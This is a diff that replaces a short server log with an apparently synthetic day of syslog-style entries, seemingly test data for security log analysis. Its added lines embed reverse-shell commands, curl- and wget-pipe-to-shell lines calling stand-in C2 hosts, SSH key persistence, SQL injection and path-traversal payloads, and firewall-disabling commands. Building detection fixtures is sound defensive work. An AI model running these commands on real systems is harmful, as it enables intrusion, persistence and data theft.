@@ -1,31 +1,143 @@
-[2024-03-15 08:01:12] [INFO] [systemd] System boot completed successfully
-[2024-03-15 08:01:15] [INFO] [sshd] Server listening on 0.0.0.0 port 22
-[2024-03-15 08:01:16] [INFO] [nginx] Starting nginx web server
+[2024-03-15 00:00:15] [INFO] [systemd] Started Daily apt download activities
+[2024-03-15 00:02:40] [INFO] [sshd] Server listening on 0.0.0.0 port 22
+[2024-03-15 00:05:01] [INFO] [cron] CRON[1204]: (root) CMD (/usr/lib/x86_64-linux-gnu/sysstat/debian-sa1 1 1)
+[2024-03-15 00:08:22] [INFO] [nginx] 192.168.1.100 - - "GET /health HTTP/1.1" 200 15
+[2024-03-15 00:12:45] [INFO] [mysql] Normal query executed on forensicdb from client 192.168.1.5
+[2024-03-15 00:15:30] [INFO] [named] client @0x7f8304000c60 192.168.1.20#51234 (internal.corp): query: internal.corp IN A + (192.168.1.1)
+[2024-03-15 00:20:10] [INFO] [systemd] Starting Rotate log files...
+[2024-03-15 00:20:12] [INFO] [logrotate] Log rotation finished successfully
+[2024-03-15 00:25:00] [INFO] [sshd] Accepted publickey for backup_user from 10.0.1.15 port 49152 ssh2
+[2024-03-15 00:30:19] [INFO] [rsync] Incremental filesystem sync started for /data/backups
+[2024-03-15 00:35:40] [INFO] [rsync] Sent 4210332 bytes, received 1204 bytes, 84230.72 bytes/sec
+[2024-03-15 00:41:00] [INFO] [nginx] 192.168.1.102 - - "GET /api/v1/system/status HTTP/1.1" 200 48
+[2024-03-15 00:45:12] [INFO] [kernel] TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies.
+[2024-03-15 00:50:00] [INFO] [cron] CRON[1840]: (system) CMD (/usr/local/bin/metrics_collector.sh)
+[2024-03-15 01:05:14] [WARN] [suricata] Fast scan: nmap detected from external IP 198.51.100.23 targeting ports 1-1024
+[2024-03-15 01:06:20] [WARN] [kernel] iptables drop log: masscan incoming probe on ports 22, 80, 443, 8080 from 198.51.100.23
+[2024-03-15 01:08:44] [WARN] [auditd] Network anomaly: rapid port scan activity identified across subnet 10.0.0.0/24
+[2024-03-15 01:15:22] [INFO] [nginx] 192.168.1.50 - - "GET /assets/style.css HTTP/1.1" 200 3421
+[2024-03-15 01:20:00] [INFO] [mysql] Table optimize completed for table audit_log
+[2024-03-15 01:25:31] [WARN] [sshd] authentication failure for root from 203.0.113.11 port 52101
+[2024-03-15 01:25:32] [WARN] [sshd] authentication failure for root from 203.0.113.12 port 52102
+[2024-03-15 01:25:33] [WARN] [sshd] authentication failure for admin from 203.0.113.13 port 52103
+[2024-03-15 01:25:34] [WARN] [sshd] authentication failure for test from 203.0.113.14 port 52104
+[2024-03-15 01:25:35] [WARN] [sshd] authentication failure for deploy from 203.0.113.15 port 52105
+[2024-03-15 01:25:36] [WARN] [sshd] authentication failure for postgres from 203.0.113.16 port 52106
+[2024-03-15 01:25:37] [WARN] [sshd] authentication failure for ubuntu from 203.0.113.17 port 52107
+[2024-03-15 01:25:38] [WARN] [sshd] authentication failure for oracle from 203.0.113.18 port 52108
+[2024-03-15 01:25:39] [ERROR] [sshd] authentication failure for guest from 203.0.113.19 port 52109
+[2024-03-15 01:25:40] [ERROR] [sshd] authentication failure for git from 203.0.113.20 port 52110
+[2024-03-15 01:28:10] [INFO] [sshd] Connection reset by peer 203.0.113.19 port 52109
+[2024-03-15 01:30:00] [INFO] [cron] CRON[2210]: (root) CMD (/usr/bin/freshclam --quiet)
+[2024-03-15 01:35:15] [INFO] [systemd] Started Clean PHP session files
+[2024-03-15 01:40:22] [INFO] [nginx] 192.168.1.10 - - "GET /api/v1/metrics HTTP/1.1" 200 812
+[2024-03-15 01:45:00] [INFO] [mysql] Aborted connection 141 to db: 'unconnected' user: 'unauthenticated' host: '192.168.1.99'
+[2024-03-15 02:00:10] [INFO] [systemd] Starting Periodic ext4 trim...
+[2024-03-15 02:00:15] [INFO] [fstrim] /: 42.5 GiB (45634928640 bytes) trimmed
+[2024-03-15 02:15:44] [WARN] [nginx] 45.33.32.156 - - "GET /view?doc=../../etc/passwd HTTP/1.1" 400 280
+[2024-03-15 02:16:02] [WARN] [nginx] 45.33.32.156 - - "GET /download.php?file=../../../../var/log/auth.log HTTP/1.1" 403 162
+[2024-03-15 02:16:30] [ERROR] [web-app] Path traversal detected in URI parameter: ../../etc/shadow
+[2024-03-15 02:22:10] [INFO] [nginx] 192.168.1.100 - - "GET /favicon.ico HTTP/1.1" 200 1150
+[2024-03-15 02:30:00] [INFO] [cron] CRON[2940]: (daemon) CMD (/opt/scripts/healthcheck.py)
+[2024-03-15 02:40:15] [WARN] [nginx] 45.33.32.156 - - "GET /search.php?query=1' or '1'='1 HTTP/1.1" 200 1420
+[2024-03-15 02:41:05] [WARN] [nginx] 45.33.32.156 - - "POST /api/login HTTP/1.1" 500 89 payload: admin' union select 1,username,password from users--
+[2024-03-15 02:41:40] [ERROR] [mysql] Syntax error near 'drop table audit_logs;--' at line 1
+[2024-03-15 02:45:00] [INFO] [nginx] 192.168.1.100 - - "GET /static/bundle.js HTTP/1.1" 200 48920
+[2024-03-15 03:00:00] [INFO] [systemd] Started System Time Synchronization
+[2024-03-15 03:10:12] [WARN] [audit] Unauthorized probe referencing CVE-2024-1234 targeting Spring Cloud Gateway
+[2024-03-15 03:12:45] [ERROR] [web-app] Known exploit payload identified: CVE-2023-38606 WebKit memory corruption
+[2024-03-15 03:14:10] [ERROR] [nginx] Exploit string detected in User-Agent matching CVE-2021-44228 JNDI lookup
+[2024-03-15 03:20:00] [INFO] [sshd] Received disconnect from 192.168.1.10 port 54221: 11: Normal Shutdown
+[2024-03-15 03:30:15] [INFO] [cron] Running hourly disk space audit
+[2024-03-15 04:00:00] [INFO] [systemd] Daily rotation of log files complete
+[2024-03-15 04:30:22] [INFO] [mysql] Binary log sync to standby node successful
+[2024-03-15 05:00:00] [INFO] [cron] CRON[3210]: (root) CMD (/usr/bin/sa2 -A)
+[2024-03-15 05:30:11] [INFO] [nginx] 192.168.1.10 - - "GET /status.json HTTP/1.1" 200 124
+[2024-03-15 06:00:01] [INFO] [systemd] Starting Daily apt activities...
+[2024-03-15 06:15:30] [INFO] [nginx] 10.0.0.12 - - "GET /api/v1/health HTTP/1.1" 200 2
+[2024-03-15 06:45:10] [ERROR] [audit] access denied for user guest attempting to read /etc/shadow
+[2024-03-15 06:46:25] [ERROR] [audit] permission denied for process 8192 executing /usr/bin/tcpdump
+[2024-03-15 06:48:00] [ERROR] [audit] user intruder received access denied on sensitive directory /root/.ssh
+[2024-03-15 06:49:15] [ERROR] [audit] permission denied for user www-data accessing /etc/ssl/private/server.key
+[2024-03-15 06:50:30] [ERROR] [audit] access denied: unauthorized token scope on secret vault endpoint /v1/secret/creds
+[2024-03-15 07:00:00] [INFO] [mysql] Master binary log rotated to mysql-bin.000412
+[2024-03-15 07:15:20] [INFO] [sshd] Accepted publickey for operator from 192.168.1.15 port 42100 ssh2
+[2024-03-15 07:30:45] [ERROR] [sudo] user attacker : 3 incorrect password attempts ; TTY=pts/2 ; COMMAND=sudo su - failed
+[2024-03-15 07:31:10] [ERROR] [sudo] user intruder : authentication failed for root privilege ; COMMAND=sudo /bin/bash failed
+[2024-03-15 07:32:00] [ERROR] [sudo] user guest : user NOT in sudoers ; TTY=pts/3 ; COMMAND=sudo cat /etc/shadow failed
+[2024-03-15 07:33:15] [ERROR] [sudo] pam_authenticate: sudo authentication failed for user deploy
+[2024-03-15 07:45:10] [INFO] [cron] CRON[3820]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)
+[2024-03-15 08:00:00] [INFO] [systemd] Started Session 42 of user operator.
+[2024-03-15 08:01:12] [INFO] [systemd] System boot check completed successfully
 [2024-03-15 08:02:30] [INFO] [sshd] Accepted publickey for admin from 192.168.1.10 port 54221
-[2024-03-15 08:05:44] [WARN] [sshd] authentication failure for root from 10.0.0.55 port 39182
-[2024-03-15 08:05:45] [WARN] [sshd] authentication failure for root from 10.0.0.55 port 39183
-[2024-03-15 08:05:46] [ERROR] [sshd] authentication failure for admin from 10.0.0.55 port 39184
 [2024-03-15 08:06:01] [INFO] [cron] Running scheduled backup job
 [2024-03-15 08:06:10] [INFO] [nginx] GET /index.html 200 OK
-[2024-03-15 08:07:22] [ERROR] [sudo] user jdoe : 3 incorrect password attempts ; TTY=pts/0 ; COMMAND=sudo su - failed
-[2024-03-15 08:07:25] [WARN] [kernel] Firewall: blocked incoming connection from 203.0.113.42
-[2024-03-15 08:08:00] [INFO] [nginx] GET /api/health 200 OK
-[2024-03-15 08:08:15] [ERROR] [audit] Access denied for user guest to /etc/shadow
-[2024-03-15 08:09:30] [INFO] [sshd] Accepted password for deploy from 192.168.1.20 port 62310
-[2024-03-15 08:10:01] [INFO] [cron] CRON job completed: /usr/local/bin/cleanup.sh
-[2024-03-15 08:10:45] [WARN] [kernel] Process nc started by user jdoe PID=8832
-[2024-03-15 08:11:02] [ERROR] [audit] permission denied for user intern accessing /var/log/auth.log
 [2024-03-15 08:12:00] [INFO] [nginx] POST /api/login 200 OK
 [2024-03-15 08:12:30] [INFO] [mysql] Query executed successfully on database forensics_db
-[2024-03-15 08:13:15] [WARN] [sshd] authentication failure for operator from 172.16.0.99 port 44210
-[2024-03-15 08:14:00] [INFO] [systemd] Service nginx reloaded
-[2024-03-15 08:14:30] [ERROR] [sudo] user intern : command not allowed ; COMMAND=sudo cat /etc/shadow failed
-[2024-03-15 08:15:00] [INFO] [cron] Running log rotation
-[2024-03-15 08:15:22] [WARN] [kernel] Suspicious process netcat detected PID=9102 user=unknown
-[2024-03-15 08:15:45] [INFO] [nginx] GET /dashboard 200 OK
-[2024-03-15 08:16:00] [ERROR] [audit] unauthorized access attempt by user test on /root/.ssh/authorized_keys
-[2024-03-15 08:16:30] [INFO] [sshd] Connection closed by 192.168.1.10
-[2024-03-15 08:17:00] [INFO] [mysql] Replication sync completed
-[2024-03-15 08:17:15] [WARN] [kernel] High CPU usage detected: 95% by process crypto_miner
-[2024-03-15 08:18:00] [INFO] [nginx] GET /static/logo.png 304 Not Modified
-[2024-03-15 08:18:30] [ERROR] [sshd] authentication failure for root from 10.0.0.55 port 39200
+[2024-03-15 08:15:30] [WARN] [kernel] Unexpected suid binary execution detected: /tmp/.hidden/find (uid=1001, euid=0)
+[2024-03-15 08:16:45] [WARN] [auditd] File permission change: setuid bit set on /var/tmp/escalate.sh
+[2024-03-15 08:17:20] [WARN] [kernel] Process executing with sgid privileges: /usr/bin/custom_wrapper
+[2024-03-15 08:30:00] [INFO] [nginx] 192.168.1.100 - - "GET /dashboard HTTP/1.1" 200 4810
+[2024-03-15 08:45:00] [INFO] [named] resolving query dns.google A IN
+[2024-03-15 09:00:00] [INFO] [systemd] Session 42 logged out cleanly
+[2024-03-15 09:30:12] [INFO] [mysql] Purged binary logs older than 7 days
+[2024-03-15 10:00:15] [INFO] [cron] CRON[4510]: (postgres) CMD (/usr/local/bin/pg_backup.sh)
+[2024-03-15 10:15:22] [WARN] [kernel] Suspicious process nc spawned by user www-data with arguments: -e /bin/sh 10.0.0.99 4444
+[2024-03-15 10:16:05] [WARN] [auditd] Binary execution: netcat listening on local port 9001
+[2024-03-15 10:16:50] [WARN] [kernel] Process ncat initiated outbound connection to unknown host 185.220.101.4:8080
+[2024-03-15 10:17:35] [WARN] [auditd] Suspicious process nc detected with active socket descriptor
+[2024-03-15 10:20:00] [INFO] [systemd] Reloading nginx configuration
+[2024-03-15 10:30:10] [ERROR] [kernel] Interactive reverse shell command detected: bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
+[2024-03-15 10:31:00] [ERROR] [auditd] Socket redirection detected via /dev/tcp/198.51.100.55/8080
+[2024-03-15 10:32:15] [ERROR] [kernel] Named pipe reverse shell created using mkfifo /tmp/p; nc 10.0.0.99 4444 0</tmp/p
+[2024-03-15 10:45:00] [INFO] [nginx] 10.0.0.12 - - "POST /api/v1/telemetry HTTP/1.1" 200 45
+[2024-03-15 11:00:00] [INFO] [cron] CRON[5120]: (root) CMD (/usr/bin/update-pciids)
+[2024-03-15 11:15:30] [WARN] [kernel] Defense evasion: iptables -F executed to flush all firewall rules
+[2024-03-15 11:16:40] [WARN] [systemd] Firewall service disabled via command: ufw disable
+[2024-03-15 11:17:55] [WARN] [auditd] Active firewall bypass detected modifying /etc/iptables/rules.v4
+[2024-03-15 11:30:00] [INFO] [mysql] Slow query logged: 2.14 sec on table transaction_records
+[2024-03-15 11:45:22] [INFO] [sshd] Accepted publickey for developer from 192.168.1.18 port 51120
+[2024-03-15 12:00:00] [INFO] [systemd] Re-executing systemd daemon
+[2024-03-15 12:30:15] [INFO] [nginx] 192.168.1.100 - - "GET /api/v1/users HTTP/1.1" 200 2310
+[2024-03-15 13:00:00] [INFO] [cron] CRON[5410]: (root) CMD (/usr/sbin/logwatch)
+[2024-03-15 13:30:00] [INFO] [mysql] Active connections: 12, idle connections: 8
+[2024-03-15 14:00:00] [INFO] [systemd] Started Daily man-db regeneration
+[2024-03-15 14:15:10] [WARN] [cron] CRON[5890]: (root) CMD (curl http://malicious-c2.net/stage2.sh | bash)
+[2024-03-15 14:16:20] [WARN] [cron] CRON[5910]: (www-data) CMD (wget http://198.51.100.99/backdoor.py -O /tmp/bd.py && python /tmp/bd.py)
+[2024-03-15 14:17:45] [WARN] [cron] CRON[5930]: (root) CMD (bash -c "wget http://c2.evildomain.org/beacon -O- | sh")
+[2024-03-15 14:30:00] [INFO] [nginx] 192.168.1.100 - - "GET /api/alerts HTTP/1.1" 200 512
+[2024-03-15 14:45:15] [INFO] [kernel] Free swap memory: 8192000 kB
+[2024-03-15 15:00:00] [INFO] [mysql] InnoDB: Buffer pool hit rate 998 / 1000
+[2024-03-15 15:20:10] [ERROR] [audit] Unauthorized persistence: echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5..." >> /root/.ssh/authorized_keys
+[2024-03-15 15:21:30] [ERROR] [auditd] Modification of authorized_keys via: cat /tmp/pubkey >> /home/admin/.ssh/authorized_keys
+[2024-03-15 15:22:45] [ERROR] [audit] Overwriting /etc/ssh/authorized_keys with echo command payload
+[2024-03-15 15:35:00] [INFO] [nginx] 192.168.1.105 - - "GET /index.html HTTP/1.1" 200 4812
+[2024-03-15 15:50:00] [INFO] [sshd] Received disconnect from 192.168.1.15 port 42100: 11: Disconnected by user
+[2024-03-15 16:00:00] [INFO] [systemd] Started Cleanup of Temporary Directories
+[2024-03-15 16:30:00] [INFO] [mysql] Checkpoint completed, flush lag 0ms
+[2024-03-15 17:00:00] [INFO] [cron] CRON[6320]: (root) CMD (/usr/local/bin/sync_clock.sh)
+[2024-03-15 17:30:15] [INFO] [nginx] 192.168.1.100 - - "GET /api/v1/metrics HTTP/1.1" 200 682
+[2024-03-15 18:00:00] [INFO] [systemd] Starting System Logging Service...
+[2024-03-15 18:15:30] [ERROR] [kernel] Anomaly: possible rootkit detected hooking sys_call_table in kernel memory
+[2024-03-15 18:16:45] [ERROR] [auditd] Process hiding detected: hidden process PID=9912 unlinked from /proc
+[2024-03-15 18:17:50] [ERROR] [kernel] Dynamic linker hijack: suspicious ld_preload configuration in /etc/ld.so.preload
+[2024-03-15 18:30:00] [INFO] [cron] Running 30-minute system check
+[2024-03-15 18:45:00] [INFO] [nginx] 10.0.0.15 - - "GET /api/v1/stats HTTP/1.1" 200 89
+[2024-03-15 19:10:15] [WARN] [kernel] Excessive CPU consumption: crypto_miner thread active with 98% utilization
+[2024-03-15 19:11:30] [WARN] [auditd] Cryptojacking payload detected: xmrig mining daemon connected to pool.monero.org
+[2024-03-15 19:12:45] [WARN] [kernel] High CPU throttling: process coinhive executed in web worker background
+[2024-03-15 19:30:00] [INFO] [systemd] Stopping user-runtime-dir@1001.service...
+[2024-03-15 19:45:00] [INFO] [mysql] Committed transaction ID 491024
+[2024-03-15 20:15:10] [ERROR] [audit] Critical security event: data exfiltration attempt detected transferring 4.2GB
+[2024-03-15 20:16:30] [ERROR] [kernel] Outbound network burst: large transfer to external IP 185.220.101.5 on port 443
+[2024-03-15 20:17:45] [ERROR] [suricata] Sensitive data leak identified: staging archived records in /tmp/dump.tar.gz
+[2024-03-15 20:30:00] [INFO] [nginx] 192.168.1.100 - - "GET /api/v1/timeline HTTP/1.1" 200 1250
+[2024-03-15 21:00:00] [INFO] [cron] CRON[7120]: (root) CMD (/usr/local/bin/integrity_check.sh)
+[2024-03-15 21:30:00] [INFO] [systemd] Daily log compression started
+[2024-03-15 22:00:00] [INFO] [mysql] MySQL server memory consumption steady at 512MB
+[2024-03-15 22:30:00] [INFO] [sshd] Server listening on 0.0.0.0 port 22
+[2024-03-15 23:00:00] [INFO] [cron] CRON[8100]: (root) CMD (/usr/lib/sysstat/debian-sa1 60 2)
+[2024-03-15 23:30:15] [INFO] [nginx] 192.168.1.102 - - "GET /health HTTP/1.1" 200 15
+[2024-03-15 23:45:00] [INFO] [kernel] All interface packet drops at zero
+[2024-03-15 23:55:12] [INFO] [sshd] Connection closed by 192.168.1.20 port 49152
+[2024-03-15 23:59:59] [INFO] [systemd] System status: all services operational; end of day 2024-03-15
